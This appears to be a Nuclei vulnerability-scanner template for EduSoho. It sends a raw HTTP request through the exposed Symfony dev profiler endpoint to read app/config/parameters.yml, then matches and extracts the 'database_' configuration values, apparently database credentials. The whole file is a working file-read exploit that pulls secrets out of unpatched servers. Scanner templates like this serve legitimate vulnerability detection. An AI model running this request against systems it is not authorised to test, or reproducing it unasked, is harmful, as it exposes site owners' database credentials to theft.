id: EduSoho-openfile-readfile

info:
  name: EduSoho-openfile-readfile
  author: msk
  severity: high

requests:
  - raw:
      - |+
        GET /app_dev.php/_profiler/open?file=app/config/parameters.yml HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1


    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"database_")

    extractors:
      - type: xpath
        part: body
        xpath:
          -  //li/code[contains(text(), 'database_')]/text()
